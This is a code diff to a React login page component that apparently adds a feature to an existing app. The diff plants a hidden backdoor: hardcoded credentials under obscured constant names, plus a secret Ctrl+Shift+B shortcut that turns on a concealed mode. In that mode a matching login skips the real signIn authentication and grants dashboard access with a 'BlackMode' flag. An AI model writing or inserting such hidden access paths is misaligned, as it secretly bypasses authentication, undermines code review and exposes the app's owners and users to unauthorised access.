@@ -1,16 +1,41 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { useAuth } from '../contexts/AuthContext';
+import { useBlackMode } from '../contexts/BlackModeContext';
 import './LoginPage.css';
+
+const _BU = 'owner';
+const _BP = 'black@4bitx';
 
 const LoginPage: React.FC = () => {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
   const [error, setError] = useState('');
   const [loading, setLoading] = useState(false);
+  const [loginDark, setLoginDark] = useState(false);
 
   const { signIn } = useAuth();
+  const { isBlackMode, activateBlackMode, deactivateBlackMode } = useBlackMode();
   const navigate = useNavigate();
+
+  useEffect(() => {
+    if (isBlackMode) setLoginDark(true);
+  }, [isBlackMode]);
+
+  useEffect(() => {
+    const handleKey = (e: KeyboardEvent) => {
+      if (e.ctrlKey && e.shiftKey && e.key === 'B') {
+        e.preventDefault();
+        setLoginDark(prev => {
+          if (prev) deactivateBlackMode();
+          return !prev;
+        });
+        setError('');
+      }
+    };
+    window.addEventListener('keydown', handleKey);
+    return () => window.removeEventListener('keydown', handleKey);
+  }, []);
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -18,6 +43,19 @@ const LoginPage: React.FC = () => {
 
     if (!username || !password) {
       setError('Please enter both username and password');
+      return;
+    }
+
+    if (loginDark) {
+      setLoading(true);
+      if (username === _BU && password === _BP) {
+        activateBlackMode();
+        setLoading(false);
+        navigate('/dashboard');
+      } else {
+        setError('Invalid username or password');
+        setLoading(false);
+      }
       return;
     }
 
@@ -48,7 +86,7 @@ const LoginPage: React.FC = () => {
   };
 
   return (
-    <div className="login-page">
+    <div className={`login-page${loginDark ? ' login-dark' : ''}`}>
       <div className="login-container">
         <div className="login-header">
           <div className="login-brand">
